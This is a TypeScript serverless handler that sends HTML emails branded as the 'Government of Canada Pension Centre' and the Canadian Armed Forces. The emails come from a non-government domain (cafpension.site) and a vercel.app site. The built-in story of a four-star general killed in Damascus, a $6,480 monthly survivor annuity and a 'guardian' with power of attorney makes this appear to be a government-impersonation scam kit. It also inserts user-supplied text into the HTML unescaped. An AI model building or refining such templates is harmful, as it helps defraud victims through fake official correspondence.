import nodemailer from 'nodemailer';

export default async function handler(req: any, res: any) {
  // Only accept POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const {
    type,
    recipientEmail,
    guardianName = 'Margaretha Byers',
    memberName = 'General Kelvin Miller',
    beneficiaryName = 'Jenny Miller',
    token = 'guardian-token',
    refNumber = 'CAF-SRV-2026-9082',
    selectedBenefit,
    customMessage,
    appUrl = 'https://caf-pension.vercel.app',
  } = req.body || {};

  const host = process.env.SMTP_HOST;
  const port = parseInt(process.env.SMTP_PORT || '465', 10);
  const user = process.env.SMTP_USER;
  const pass = process.env.SMTP_PASS;
  const secure = process.env.SMTP_SECURE === 'true' || port === 465;
  const from = process.env.SMTP_FROM || `"CAF Pension Centre" <${user || 'support@cafpension.site'}>`;

  // Destination Gmail / Admin recipient
  const targetEmail =
    process.env.GMAIL_RECIPIENT ||
    process.env.ADMIN_EMAIL ||
    recipientEmail ||
    user ||
    'support@cafpension.site';

  const dossierUrl = `${appUrl.replace(/\/$/, '')}/g/${token}/case-file`;
  const inviteUrl = `${appUrl.replace(/\/$/, '')}/g/${token}`;

  let subject = '';
  let html = '';

  const timestamp = new Date().toLocaleString('en-CA', {
    timeZone: 'America/Toronto',
    dateStyle: 'full',
    timeStyle: 'medium',
  });

  if (type === 'benefit_election') {
    const benefitTitle = selectedBenefit?.title || 'Monthly Survivor Annuity for Jenny Miller';
    const benefitAmount = selectedBenefit?.amount || '$6,480.00 / month';

    subject = `🍁 [CAF Pension Centre] Benefit Option Selected: ${benefitTitle} (${refNumber})`;
    html = `
      <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; max-width: 640px; margin: 0 auto; color: #1E293B; background: #F8FAFC; padding: 20px;">
        <div style="background: #0B3866; color: #FFFFFF; padding: 24px; border-radius: 8px 8px 0 0;">
          <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 6px;">
            <span style="font-size: 20px;">🍁</span>
            <span style="font-size: 13px; font-weight: 700; letter-spacing: 0.08em; text-transform: uppercase; color: #93C5FD;">Government of Canada · Pension Centre</span>
          </div>
          <h1 style="margin: 0; font-size: 22px; font-weight: 800; color: #FFFFFF; line-height: 1.2;">
            Survivor Benefit Option Selected
          </h1>
          <p style="margin: 6px 0 0; font-size: 14px; color: #E2E8F0;">
            Case Reference: <strong style="color: #FFFFFF; font-family: monospace;">${refNumber}</strong>
          </p>
        </div>

        <div style="padding: 28px 24px; background: #FFFFFF; border: 1px solid #CBD5E1; border-top: none; border-radius: 0 0 8px 8px;">
          <div style="background: #DCFCE7; border: 1px solid #86EFAC; border-radius: 6px; padding: 14px 18px; margin-bottom: 24px;">
            <div style="font-size: 11px; font-weight: 800; text-transform: uppercase; color: #15803D; letter-spacing: 0.05em;">
              ✓ Election Successfully Recorded
            </div>
            <div style="font-size: 18px; font-weight: 800; color: #0F172A; margin-top: 3px;">
              ${benefitTitle}
            </div>
            <div style="font-size: 20px; font-weight: 900; color: #0B3866; font-family: monospace; margin-top: 4px;">
              ${benefitAmount}
            </div>
          </div>

          <h2 style="font-size: 16px; font-weight: 800; color: #0F172A; margin: 0 0 14px; text-transform: uppercase; letter-spacing: 0.04em; border-bottom: 2px solid #E2E8F0; padding-bottom: 6px;">
            Application & Beneficiary Details
          </h2>

          <table style="width: 100%; border-collapse: collapse; font-size: 14px; margin-bottom: 24px;">
            <tbody>
              <tr style="border-bottom: 1px solid #F1F5F9;">
                <td style="padding: 10px 0; color: #64748B; font-weight: 600; width: 42%;">Elected Benefit Option</td>
                <td style="padding: 10px 0; color: #0F172A; font-weight: 700;">${benefitTitle}</td>
              </tr>
              <tr style="border-bottom: 1px solid #F1F5F9;">
                <td style="padding: 10px 0; color: #64748B; font-weight: 600;">Disbursement Amount</td>
                <td style="padding: 10px 0; color: #0B3866; font-weight: 800; font-family: monospace;">${benefitAmount}</td>
              </tr>
              <tr style="border-bottom: 1px solid #F1F5F9;">
                <td style="padding: 10px 0; color: #64748B; font-weight: 600;">Designated Beneficiary</td>
                <td style="padding: 10px 0; color: #0F172A; font-weight: 700;">${beneficiaryName} (Surviving Daughter)</td>
              </tr>
              <tr style="border-bottom: 1px solid #F1F5F9;">
                <td style="padding: 10px 0; color: #64748B; font-weight: 600;">Deceased Member</td>
                <td style="padding: 10px 0; color: #0F172A; font-weight: 700;">${memberName}</td>
              </tr>
              <tr style="border-bottom: 1px solid #F1F5F9;">
                <td style="padding: 10px 0; color: #64748B; font-weight: 600;">Service ID / Reg No.</td>
                <td style="padding: 10px 0; color: #0F172A; font-family: monospace;">M554321 / 554321</td>
              </tr>
              <tr style="border-bottom: 1px solid #F1F5F9;">
                <td style="padding: 10px 0; color: #64748B; font-weight: 600;">Rank & Branch</td>
                <td style="padding: 10px 0; color: #0F172A;">General (4-Star) · Canadian Army</td>
              </tr>
              <tr style="border-bottom: 1px solid #F1F5F9;">
                <td style="padding: 10px 0; color: #64748B; font-weight: 600;">Status</td>
                <td style="padding: 10px 0; color: #DC2626; font-weight: 700;">Killed in action (Damascus, Syria)</td>
              </tr>
              <tr style="border-bottom: 1px solid #F1F5F9;">
                <td style="padding: 10px 0; color: #64748B; font-weight: 600;">Legal Representative</td>
                <td style="padding: 10px 0; color: #0F172A; font-weight: 700;">${guardianName} (Power of Attorney)</td>
              </tr>
              <tr style="border-bottom: 1px solid #F1F5F9;">
                <td style="padding: 10px 0; color: #64748B; font-weight: 600;">Official Form Package</td>
                <td style="padding: 10px 0; color: #0F172A;">Form CF-FC 2489 (Pre-filled PDF)</td>
              </tr>
              <tr>
                <td style="padding: 10px 0; color: #64748B; font-weight: 600;">Submission Timestamp</td>
                <td style="padding: 10px 0; color: #475569;">${timestamp}</td>
              </tr>
            </tbody>
          </table>

          <div style="text-align: center; margin: 28px 0;">
            <a href="${dossierUrl}" style="display: inline-block; background: #0B3866; color: #FFFFFF; text-decoration: none; padding: 12px 24px; font-weight: 700; border-radius: 6px; font-size: 15px;">
              View Military Casualty Dossier Online &rarr;
            </a>
          </div>

          <hr style="border: none; border-top: 1px solid #E2E8F0; margin: 24px 0 16px;" />

          <p style="font-size: 12px; color: #64748B; margin: 0; line-height: 1.5;">
            Protected B when completed · Directorate of Casualty Support Management (DCSM) · Government of Canada Pension Centre<br>
            Official Correspondence: support@cafpension.site · Toll-free: 1-800-267-0325
          </p>
        </div>
      </div>
    `;
  } else if (type === 'invite') {
    subject = `Action required: Finish pension application for ${memberName}`;
    html = `
      <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 600px; margin: 0 auto; color: #14263C; line-height: 1.5;">
        <div style="background: #14263C; color: #FFFFFF; padding: 20px 24px;">
          <h2 style="margin: 0; font-size: 18px; font-weight: 700;">CAF Pension Centre</h2>
          <p style="margin: 4px 0 0; font-size: 13px; color: #C9D6E6;">Online pension application · Canadian Armed Forces</p>
        </div>

        <div style="padding: 32px 24px; background: #FFFFFF; border: 1px solid #DCE3EB; border-top: none;">
          <h1 style="font-size: 22px; color: #14263C; margin-top: 0;">Hello ${guardianName || 'Guardian'},</h1>
          <p style="font-size: 16px;">
            <strong>${memberName}</strong> has completed their portion of the Canadian Armed Forces retirement pension application and has designated you as their legal representative to finish the final steps.
          </p>

          ${
            customMessage
              ? `<blockquote style="background: #F4F6F8; border-left: 4px solid #0B5CAD; margin: 20px 0; padding: 12px 16px; font-style: italic; color: #4A5565;">
                  "${customMessage}"
                </blockquote>`
              : ''
          }

          <div style="margin: 28px 0;">
            <a href="${inviteUrl}" style="display: inline-block; background: #0B5CAD; color: #FFFFFF; text-decoration: none; padding: 14px 28px; font-weight: 600; border-radius: 6px; font-size: 16px;">
              Open and Complete Application
            </a>
          </div>

          <p style="font-size: 14px; color: #64748B;">
            This link is valid for 14 days. If the button above does not work, copy and paste this URL into your browser:<br>
            <a href="${inviteUrl}" style="color: #0B5CAD; word-break: break-all;">${inviteUrl}</a>
          </p>

          <hr style="border: none; border-top: 1px solid #E2E8F0; margin: 32px 0 20px;" />

          <p style="font-size: 13px; color: #64748B; margin: 0;">
            Government of Canada Pension Centre · PO Box 9500, Matane QC G4W 0H3<br>
            Questions? Call 1-800-267-0325 (Mon–Fri 8:00 to 16:00 ET).
          </p>
        </div>
      </div>
    `;
  } else if (type === 'submitted') {
    subject = `Application Submitted: CAF Pension Application for ${memberName} (${refNumber})`;
    html = `
      <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 600px; margin: 0 auto; color: #14263C; line-height: 1.5;">
        <div style="background: #14263C; color: #FFFFFF; padding: 20px 24px;">
          <h2 style="margin: 0; font-size: 18px; font-weight: 700;">CAF Pension Centre</h2>
          <p style="margin: 4px 0 0; font-size: 13px; color: #C9D6E6;">Online pension application · Canadian Armed Forces</p>
        </div>

        <div style="padding: 32px 24px; background: #FFFFFF; border: 1px solid #DCE3EB; border-top: none;">
          <div style="background: #1F6F4A; color: #FFFFFF; border-radius: 6px; padding: 20px; text-align: center; margin-bottom: 24px;">
            <h2 style="margin: 0 0 6px; font-size: 20px;">Application Successfully Submitted</h2>
            <p style="margin: 0; font-size: 15px;">Reference: <strong>${refNumber}</strong></p>
          </div>

          <p style="font-size: 16px;">
            Hello ${guardianName || 'Guardian'},
          </p>
          <p style="font-size: 15px;">
            The pension application for <strong>${memberName}</strong> has been received by the Government of Canada Pension Centre.
          </p>
        </div>
      </div>
    `;
  } else {
    return res.status(400).json({ error: 'Invalid type parameter' });
  }

  // Check if SMTP is configured
  if (!user || !pass) {
    console.log(`[SMTP SIMULATION] To: ${targetEmail} | Subject: "${subject}"`);
    return res.status(200).json({
      success: true,
      simulated: true,
      message: 'SMTP credentials not configured in Vercel environment. Email logged to server console in simulation mode.',
      preview: {
        to: targetEmail,
        subject,
      },
    });
  }

  try {
    // Gmail-specific or custom SMTP transporter
    const isGmail = host === 'smtp.gmail.com' || (!host && user.endsWith('@gmail.com'));
    const transporter = nodemailer.createTransport(
      isGmail
        ? {
            service: 'gmail',
            auth: {
              user,
              pass,
            },
          }
        : {
            host: host || 'smtp.gmail.com',
            port,
            secure,
            auth: {
              user,
              pass,
            },
          }
    );

    const info = await transporter.sendMail({
      from,
      to: targetEmail,
      subject,
      html,
    });

    console.log(`[SMTP DELIVERED] MessageId: ${info.messageId} to ${targetEmail}`);

    return res.status(200).json({
      success: true,
      simulated: false,
      messageId: info.messageId,
      deliveredTo: targetEmail,
    });
  } catch (err: any) {
    console.error('SMTP Error:', err);
    return res.status(500).json({
      error: 'Failed to send email via SMTP',
      details: err.message,
    });
  }
}
